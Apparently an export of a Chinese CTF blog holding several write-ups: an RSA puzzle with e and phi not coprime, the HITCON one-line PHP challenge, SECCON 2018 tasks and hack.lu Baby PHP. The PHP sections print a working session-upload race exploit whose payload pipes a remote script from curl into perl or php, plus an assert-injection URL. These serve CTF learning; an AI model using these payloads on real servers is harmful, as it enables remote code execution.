writeup"},{"content":"这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。\n如果没有理解错误的话，不互质并不会导致加密不安全，只是无法解密了，而且明文和密文在模数范围内也不再是一一对应。\n此时如果有多个加密过程，他们的明文m和加密指数e相等，n不相等，那么只要能够构建一定数量的同余式，就可以用中国剩余定理求解，类似于广播攻击。\n另一种思路就是本题的情况。多个同余式中的若干个n是可分解的，那么排列组合他们的p，q，以使得某种组合的phi能够和e互质，然后可以把模数降到这种组合的n值，就可以解出明文了。当然，这题的情况大概不是常有的。\n题目内容如下：\n1 2 3 4 5 6 7 8 9 10 11 n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L e1=0xfae3aL c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L e2=0x1f9eaeL c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L assert pow(flag,e1,n1)==c1 assert pow(flag,e2,n2)==c2 assert gcd(e1,(p1-1)*(q1-1))==14 assert gcd(e2,(p2-1)*(q2-1))==14 解答代码如下，为了给学弟看，做了具体的注释。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 # -*- coding : utf-8 -*- # python 3.7 # __author__ = \u0026#39;https://github.com/findneo\u0026#39; import gmpy2 import requests import json import binascii def factordb(n): api=\u0026#34;http://factordb.com/api.php\u0026#34; r=requests.get(api,params={\u0026#39;query\u0026#39;:n}) res=json.loads(r.content) if res[\u0026#39;status\u0026#39;] == \u0026#34;FF\u0026#34;: p,q=res[\u0026#39;factors\u0026#39;][0][0],res[\u0026#39;factors\u0026#39;][1][0] [p,q]=map(int,[p,q]) # print(\u0026#39;\\n\u0026#39;.join([hex(p),hex(q)])) return p,q else: print(\u0026#34;not fully factored!\u0026#34;) n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723 e1=0xfae3a c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbea p1,q1=factordb(n1) # p1=0xe5d7acdf77ca09e4391f21cea16c01cd2302d1a1df3983d413e9ee91fce8d9184ec0d0ca1608dbed748ed905a2beddc00168a1245f27f67e1240073c3d097965 # q1=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7 n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63 e2=0x1f9eae c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347 p2,q2=factordb(n2)[::-1] # p2=0xeae0dfb99949af5175c425e22ec3c2e5b73cec0b70510dcc0ccd368ca6e868146c8783fa4aee0548fc725a3c3b0e46e44ec60357d3e6f4a5207e8a8ddf9c1225 # q2=0xe76aed4830504369c7c12070490f18900b80da1035ef82991dd35c52fd51731025c4498e8998bd026b9898963b6b69ded47b1dd96c264eac9d875756fd1b29e7 assert(q1==q2) q=q1 # n1,n2均可分解，且有一个公因数 # 由于gcd(e,phi)==14，将 (flag**e)%n = c 看作 (((flag**14)%n) ** (e//14) ) % n == c # 分别记 e//14为e1,e2 , (flag**14)%n1 为 f1 , (flag**14)%n2 为 f2,则 pow(f1,e1,n1)==c1,pow(f2,e2,n2)==c2 且 gcd(e1,phi1)==gcd(e2,phi2)==1。可求得 f1,f2 e1=e1//14;e2=e2//14 phi1=(p1-1)*(q1-1);phi2=(p2-1)*(q2-1) d1=gmpy2.invert(e1,phi1);d2=gmpy2.invert(e2,phi2) f1=pow(c1,d1,n1);f2=pow(c2,d2,n2) # 记 flag**14 为 f3,则有同余方程组 f3 % n1 == f1; f3 % n2 == f2。其中f1,f2,n1,n2已知，可求模lcm(n1,n2)意义下的解 f3。 # 参考 https://findneo.github.io/180727rsa-attack/#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86。 def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) #(解,最小公倍数) f3,lcm = GCRT([n1,n2],[f1,f2]) assert(f3%n1==f1);assert(f3%n2==f2);assert(lcm==p1*p2*q) # assert(flag**14 % lcm == f3) # 此时求出的 f3 满足上式。其中 lcm==p1*p2*q 有5个约数: 1, p1*q即n1 ,p2*q即n2, p1*p2记作n3, lcm。 # 上式可看作 pow(flag**2,7,lcm)==f3，等价于 pow(flag**2,7,n1)==f3%n1,pow(flag**2,7,n2)==f3%n2,pow(flag**2,7,n3)==f3%n3 # 由于 gcd(7,n1)==7,gcd(7,n2)==7。所以尝试选取 pow(flag**2,7,n3)==f3%n3 计算 flag**2 的值 n3=p1*p2 c3=f3%n3 phi3=(p1-1)*(p2-1) assert(gmpy2.gcd(7,phi3)==1) d3=gmpy2.invert(7,phi3) m3=pow(c3,d3,n3) if gmpy2.iroot(m3,2)[1] == 1: flag=gmpy2.iroot(m3,2)[0] print(binascii.unhexlify(hex(flag)[2:])) # b\u0026#39;EIS{Comm0n_Div15or_plus_CRT_is_so_easy|cb2733b9e69ab3a9bd526fa1}\u0026#39; ","permalink":"https://ret2neo.cn/post/181124-what-if-e-phi-not-coprime/","summary":"这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。\n如果没有理解错误的话，不互质并不会导致加密不安全，只是无法解密了，而且明文和密文在模数范围内也不再是一一对应。\n此时如果有多个加密过程，他们的明文m和加密指数e相等，n不相等，那么只要能够构建一定数量的同余式，就可以用中国剩余定理求解，类似于广播攻击。\n另一种思路就是本题的情况。多个同余式中的若干个n是可分解的，那么排列组合他们的p，q，以使得某种组合的phi能够和e互质，然后可以把模数降到这种组合的n值，就可以解出明文了。当然，这题的情况大概不是常有的。\n题目内容如下：\n1 2 3 4 5 6 7 8 9 10 11 n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L e1=0xfae3aL c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L e2=0x1f9eaeL c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L assert pow(flag,e1,n1)==c1 assert pow(flag,e2,n2)==c2 assert gcd(e1,(p1-1)*(q1-1))==14 assert gcd(e2,(p2-1)*(q2-1))==14 解答代码如下，为了给学弟看，做了具体的注释。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 # -*- coding : utf-8 -*- # python 3.","title":"如果RSA加密中的e和phi不互质"},{"content":"源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。\n解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123\u0026amp;foo=bar ，则 $_GET 为 array ('orange' =\u0026gt; '123','foo' =\u0026gt; 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为\u0026lt;?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ? (expr2) : (expr3) 是一个条件运算符，和C语言类似。 使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是@\u0026lt;?php ，就将它包含并运行。 相关文档： Assignment Operators , $_GET , Error Control Operators , 三元运算符 关键点 创建文件 allow_url_include 默认值是off ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。\n最主要的利用点在于：如果在上传文件的同时POST PHP_SESSION_UPLOAD_PROGRESS 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。\n做个实验。\n我的环境：PHP7.2 + Apache on Kali 4.18\n会发现确实如此。而且不仅如此。\n1 2 3 4 curl -s 127.0.0.1/oneline.php -H \u0026#39;Cookie: PHPSESSID=iamnotorange\u0026#39; -F \u0026#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking\u0026#39; -F \u0026#39;file=@/etc/passwd\u0026#39; 1\u0026gt;/dev/null curl -s 127.0.0.1/oneline.php -H \u0026#39;Cookie: PHPSESSID=iamnotorange2\u0026#39; -F \u0026#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2\u0026#39; -F \u0026#39;foobar=anystring\u0026#39; 1\u0026gt;/dev/null curl -s 127.0.0.1/oneline.php -H \u0026#39;Cookie: PHPSESSID=iamnotorange3\u0026#39; -F \u0026#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3\u0026#39; 1\u0026gt;/dev/null curl -s 127.0.0.1/oneline.php -H \u0026#39;Cookie: PHPSESSID=iamnotorange4\u0026#39; -d \u0026#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4\u0026#39; 1\u0026gt;/dev/null 我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。\n但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 session.upload_progress.cleanup=on ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。\n条件竞争 1 2 3 4 5 6 7 8 9 10 11 #loop.py import os from multiprocessing.dummy import Pool as threadpool sessname=\u0026#34;iamnotorange\u0026#34; def runner(i): cmd=\u0026#34;curl -s 127.0.0.1/oneline.php -H \u0026#39;Cookie: PHPSESSID=%s\u0026#39; -F \u0026#39;PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking\u0026#39; -F \u0026#39;file=@/etc/passwd\u0026#39; 1\u0026gt;/dev/null\u0026#34;%sessname os.system(cmd) os.system(\u0026#34;xxd /var/lib/php/sessions/sess_%s \u0026#34;%sessname) pool=threadpool(30) result=pool.map_async(runner,range(30)).get(0xffff) 可以观察到，文件内容的前一部分是可控的。\n超大文件 变换文件内容 到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以upload_progress_ 开头，而我们期望他是以 @\u0026lt;?php 开头。于是需要变换文件内容，可以利用 php://filter ，比如将文件内容多次base64解码得到我们想要的字符串。\nbase64解码的特点在于：\n可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。 base64编码后的字符串只会包含 [0-9a-z-A-Z+\\=] ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。 所以实际上\n1 python -c \u0026#34;import base64;print base64.b64decode(\u0026#39;\\x11\\x22\\x23\\x24\u0026#39;*24+base64.b64encode(\u0026#39;test\u0026#39;))\u0026#34; 的执行结果还是test。\n我们只要想办法让upload_progress_ 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 upload_progress_ 有16个字符\n结合利用 将诸如\n1 @\u0026lt;?php `curl remote.ip | php - ;?\u0026gt;` 的payload三次编码再加上填充数据后作为 PHP_SESSION_UPLOAD_PROGRESS 的值上传，然后利用\nphp://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 #https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py import sys import string import requests from base64 import b64encode from random import sample, randint from multiprocessing.dummy import Pool as ThreadPool HOST = \u0026#39;http://54.250.246.238/\u0026#39; sess_name = \u0026#39;iamorange\u0026#39; headers = { \u0026#39;Connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;Cookie\u0026#39;: \u0026#39;PHPSESSID=\u0026#39; + sess_name } payload = \u0026#39;@\u0026lt;?php `curl orange.tw/w/bc.pl|perl -`;?\u0026gt;\u0026#39; while 1: junk = \u0026#39;\u0026#39;.join(sample(string.ascii_letters, randint(8, 16))) x = b64encode(payload + junk) xx = b64encode(b64encode(payload + junk)) xxx = b64encode(b64encode(b64encode(payload + junk))) if \u0026#39;=\u0026#39; not in x and \u0026#39;=\u0026#39; not in xx and \u0026#39;=\u0026#39; not in xxx: payload = xxx print payload break def runner1(i): data = { \u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;ZZ\u0026#39; + payload + \u0026#39;Z\u0026#39; } while 1: fp = open(\u0026#39;/etc/passwd\u0026#39;, \u0026#39;rb\u0026#39;) r = requests.post(HOST, files={\u0026#39;f\u0026#39;: fp}, data=data, headers=headers) fp.close() def runner2(i): filename = \u0026#39;/var/lib/php/sessions/sess_\u0026#39; + sess_name filename = \u0026#39;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s\u0026#39; % filename # print filename while 1: url = \u0026#39;%s?orange=%s\u0026#39; % (HOST, filename) r = requests.get(url, headers=headers) c = r.content if c and \u0026#39;orange\u0026#39; not in c: print [c] if sys.argv[1] == \u0026#39;1\u0026#39;: runner = runner1 else: runner = runner2 pool = ThreadPool(32) result = pool.map_async( runner, range(32) ).get(0xffff) 相关链接 http://www.wupco.cn/?p=4460 https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge https://bugs.php.net/bug.php?id=72681 ","permalink":"https://ret2neo.cn/post/181123-one-line-php-challenge/","summary":"源码 环境：This is a default installation PHP7.2 + Apache on Ubuntu 18.04 。\n解读 $_GET 是一个数组，包含通过URL参数传给当前脚本的变量。如访问localhost?orange=123\u0026amp;foo=bar ，则 $_GET 为 array ('orange' =\u0026gt; '123','foo' =\u0026gt; 'bar',) ，$_GET['orange'] 为'123' 。另外，$_GET 是超全局变量，即在全部作用域中始终可用的内置变量。 @被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为\u0026lt;?php $_=$_GET['orange']; 的PHP文件，直接访问其会报错 Notice : Undefined index: orange in... ，加上 @ 后就不会显示错误信息。 赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。The value of an assignment expression is the value assigned 。 $_ 。一个普通的变量名。 file() 。把整个文件读入数组中。 array file ( string $filename [, int $flags = 0 [, resource $context ]] ) string substr ( string $string , int $start [, int $length ] ) 。 include 语句包含并运行指定文件。 (expr1) ?","title":"one-line-php-challenge 复现"},{"content":"Forensics Unzip 压缩命令为\n1 2 echo \u0026#39;SECCON{\u0026#39;`cat key`\u0026#39;}\u0026#39; \u0026gt; flag.txt zip -e --password=`perl -e \u0026#34;print time()\u0026#34;` flag.zip flag.txt update:\n比较棒的思路是flag.zip生成时刻的时间戳就是他的密码。那么\n1 2 $stat -c %Y flag.zip 1540566641 爆破密码：\nHistory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ binwalk J DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 3912330 0x3BB28A ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file type: binary, original name: \u0026#34;1\u0026#34;, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS # MS-DOS 以小端序存储数据 $ strings -el J | grep SEC ...foo... \u0026lt;SEC{.txt ...bar... $ strings -el J | grep CON ...foo... \u0026lt;CON{.txt ...bar... $ strings -el J | grep .txt | uniq ...foo... \u0026lt;SEC.txt \u0026lt;CON{.txt \u0026lt;F0r.txt \u0026lt;tktksec.txt \u0026lt;F0r.txt \u0026lt;ensic.txt \u0026lt;s.txt \u0026lt;_usnjrnl.txt \u0026lt;2018}.txt \u0026lt;logfile.txt.0 $ strings -el J | grep .txt | uniq | tail -n 10 | sed -E \u0026#39;s/\u0026lt;(.*).txt.*/\\1/g\u0026#39; | tr -d \u0026#39;\\n\u0026#39; | grep -o \u0026#39;SECCON{.*}\u0026#39; SECCON{F0rtktksecF0rensics_usnjrnl2018} Reversing Runme misc式的水题。就是不断跟进函数，每个函数传入一个参数，拼凑起来就可以了。会得到 \u0026quot;C:\\Temp\\SECCON2018Online.exe\u0026quot; SECCON{Runn1n6_P47h} 。\nupdate:\n比较骚的做法是直接strings\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ strings runme !This program cannot be run in DOS mode. ...foo... BRjS BRjE BRjC BRjC BRjO BRjN BRj{ BRjR BRju ...bar... $ strings runme | sed -E \u0026#39;s/BRj(.)/\\1/g\u0026#39; | tr -d \u0026#39;\\n\u0026#39; | grep -o \u0026#39;SECCON{.*}\u0026#39; SECCON{Runn1n6_P47h} Media Needle in a haystack 提供一个YouTube的视频链接（https://www.youtube.com/watch?v=sTKP2btHSBQ ），长达九个多小时。\n从 https://y2mate.com/youtube/sTKP2btHSBQ 下载360p的，差不多1.9G。快进查看会发现右下角有一个房间的灯亮灭很有规律，基本每分钟都会有变化。\n我们把亮记为1，暗记为0的话，整个视频时长545分钟，可以得到约545比特的信息。大概是这样：\n其中有四种数据，0，1 ，000 ，111 ，分别对应亮、暗、长亮、长暗四种状态，对应到摩斯电码则是. ，短间隔，- ，长间隔 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # -*- coding: utf-8 -*- # __author__ = findneo def do(s): res=\u0026#39;\u0026#39; i=0 while i\u0026lt;len(s): if s[i:i+3] == \u0026#39;000\u0026#39;: res+=\u0026#39; \u0026#39; i+=3 elif s[i:i+3] == \u0026#39;111\u0026#39;: res+=\u0026#39;-\u0026#39; i+=3 elif s[i] == \u0026#39;1\u0026#39;: res+=\u0026#39;.\u0026#39; i+=1 elif s[i] == \u0026#39;0\u0026#39;: i+=1 return res raw=\u0026#39;01010100010001110101110100011101011101000111011101110001110100011101011101110100010101000111011101110001110111000100011100010100011101110001000101010001110101010101110001011100011101010101011100010101000100011101011101000101110100010001110001110101010101110001110111000100010101000101010001011100011101110100010001110101010101110001110101010001011101000111011101110001011100011101010001110101110100010111000101010001110??01010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111\u0026#39; may=\uu0026#39; print(do(may)) # ... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ..- ..... - ...- . . -. ..- ..-. ..- .. . - .. . .. -. # http://rumkin.com/tools/cipher/morse.php # SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTU5TVEENUFUIETIEIN 天亮后看得很不清晰了，而且貌似 6h58min 之后窗户都会间歇性地被关上，所以flag的后半段有点问题。\nupdate:\n实际上天亮以后用窗户的开关来表示，窗户打开为1，窗户关闭为0（正好和原来的处理方式01相反，所以得不到flag），思维太僵硬啊😂\n那么就得到如下结果：\n1 2 3 010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100010101000111010101010111000111010101000111011101110001011101010001110101000101110101000111010111011100011101011101110101110000 ... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ... -....- -... --- .-.. -.. .-.. -.-- -.--.- SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTS-BOLDLY) 这个图片解释得很到位了，不过我觉得徒手开关两个多小时的窗户太不黑客了吧，他们一定用了某种方式自动化。\nupdate2:\n有大佬做了自动化，效果蛮好的。\n（https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/ ）\n","permalink":"https://ret2neo.cn/post/181028-seccon-wp/","summary":"Forensics Unzip 压缩命令为\n1 2 echo \u0026#39;SECCON{\u0026#39;`cat key`\u0026#39;}\u0026#39; \u0026gt; flag.txt zip -e --password=`perl -e \u0026#34;print time()\u0026#34;` flag.zip flag.txt update:\n比较棒的思路是flag.zip生成时刻的时间戳就是他的密码。那么\n1 2 $stat -c %Y flag.zip 1540566641 爆破密码：\nHistory 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ binwalk J DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 3912330 0x3BB28A ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file type: binary, original name: \u0026#34;1\u0026#34;, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS # MS-DOS 以小端序存储数据 $ strings -el J | grep SEC .","title":"SECCON 2018"},{"content":"Baby PHP 环境：https://arcade.fluxfingers.net:1819/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;?php require_once(\u0026#39;flag.php\u0026#39;); error_reporting(0); if(!isset($_GET[\u0026#39;msg\u0026#39;])){ highlight_file(__FILE__); die(); } @$msg = $_GET[\u0026#39;msg\u0026#39;]; if(@file_get_contents($msg)!==\u0026#34;Hello Challenge!\u0026#34;){ die(\u0026#39;Wow so rude!!!!1\u0026#39;); } echo \u0026#34;Hello Hacker! Have a look around.\\n\u0026#34;; @$k1=$_GET[\u0026#39;key1\u0026#39;]; @$k2=$_GET[\u0026#39;key2\u0026#39;]; $cc = 1337;$bb = 42; if(intval($k1) !== $cc || $k1 === $cc){ die(\u0026#34;lol no\\n\u0026#34;); } if(strlen($k2) == $bb){ if(preg_match(\u0026#39;/^\\d+＄/\u0026#39;, $k2) \u0026amp;\u0026amp; !is_numeric($k2)){ if($k2 == $cc){ @$cc = $_GET[\u0026#39;cc\u0026#39;]; } } } list($k1,$k2) = [$k2, $k1]; if(substr($cc, $bb) === sha1($cc)){ foreach ($_GET as $lel =\u0026gt; $hack){ $$lel = $hack; } } $‮b = \u0026#34;2\u0026#34;;$a=\u0026#34;‮b\u0026#34;;//;1=b if($$a !== $k1){ die(\u0026#34;lel no\\n\u0026#34;); } // plz die now assert_options(ASSERT_BAIL, 1); assert(\u0026#34;$bb == $cc\u0026#34;); echo \u0026#34;Good Job ;)\u0026#34;; // TODO // echo $flag; 用 php -S 127.0.0.1:8080 起一个本地服务用于调试。\n13~15行可通过PHP wrapper 绕过。\n1 2 3 curl \u0026#34;https://arcade.fluxfingers.net:1819?msg=php://input\u0026#34; -d \u0026#34;Hello Challenge!\u0026#34; or curl \u0026#34;https://arcade.fluxfingers.net:1819?msg=data://text/plain,Hello%20Challenge!\u0026#34; 24~26行传入key1=1337即可，$k1类型为string。\n29行的美元符是个宽字节字符，并不是ASCII为36的字符。\n1 2 \u0026gt;encodeURI(\u0026#34;＄\u0026#34;) \u0026lt;\u0026#34;%EF%BC%84\u0026#34; 1 2 3 4 5 php \u0026gt; $e=str_repeat(\u0026#34;0\u0026#34;,42-3-4).\u0026#34;1337 \u0026#34;; php \u0026gt; echo strlen($e); 42 php \u0026gt; echo $e; 000000000000000000000000000000000001337＄ 38行可以通过传入数组绕过。39行有变量覆盖。\n44行是个障眼法，在第一个美元符后有个Unicode 字符(U+202e)，用以左右反转，详见 rtlo-trick。十六进制看起来实际上是这样：\n1 2 000002f0: 24e2 80ae 6220 3d20 2232 223b 2461 3d22 $...b = \u0026#34;2\u0026#34;;$a=\u0026#34; 00000300: e280 ae62 223b 2f2f 3b31 3d62 0d0a 0d0a ...b\u0026#34;;//;1=b.... 就是说，第44行是 $\\u{202E}b = \u0026quot;2\u0026quot;;$a=\u0026quot;\\u{202E}b\u0026quot;;//;1=b ，但经过Unicode字符作用后显示出来的是$b=1;//;\u0026quot;b\u0026quot;=a$;\u0026quot;2\u0026quot; = b 。推荐一个辅助工具：https://r12a.github.io/app-conversion/ 。\n则$$a的值为2，传入k1=2即可。\n51行设置在断言失败时中止执行。\n52行可以执行PHP代码。\n1 2 λ curl -sg \u0026#34;https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!\u0026amp;key1=1337\u0026amp;key2=000000000000000000000000000000000001337%EF%BC%84\u0026amp;cc[]=\u0026amp;k1=2\u0026amp;bb=highlight_file(%22flag.php%22);//\u0026#34; | grep -o \u0026#39;flag{.*}\u0026#39; flag{7c217708c5293a3264bb136ef1fadd6e} ","permalink":"https://ret2neo.cn/post/181022-hackluctf-web/","summary":"Baby PHP 环境：https://arcade.fluxfingers.net:1819/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;?php 